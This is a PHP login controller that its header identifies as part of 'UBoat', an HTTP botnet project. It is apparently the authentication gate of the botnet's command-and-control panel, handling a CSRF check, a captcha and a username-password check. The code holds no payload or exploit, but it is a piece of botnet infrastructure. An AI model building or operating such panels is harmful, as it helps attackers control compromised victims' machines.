<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class Login extends Controller
{
    public function index()
    {
        if (isset($_SESSION['csrf'])) {
            $helper = $this->loadHelper('AuthVerify');

            if (! isset($helper->verify()['Error'])) {
                $this->redirect('main');
            }
        }
        $cap = $this->loadHelper('capcha');
        if (isset($_POST['lg_username']) && isset($_POST['lg_password']) && ! empty(goat::$app->getFlash('_cap')) && isset($_POST['capcha'])) {
            $_cap = goat::$app->getFlash('_cap');
            if ($_POST['capcha'] !== $_cap) {
                goat::$app->setFlash('_login_error', ['Error' => 'Invalid capcha, please retry.']);

                return $this->loadView('login')->render(['cap' => $cap]);
            }

            $user = $this->loadModel('user');
            $rep = $user->actionAuth(['username' => $_POST['lg_username'], 'password' => $_POST['lg_password']]);
            if ($rep) {
                $this->redirect('main');
            } else { //magestically decline
                goat::$app->setFlash('_login_error', ['Error' => 'Password or username doesn\'t exist.']);
            }
        }

        return $this->loadView('login')->render(['cap' => $cap]);
    }
}
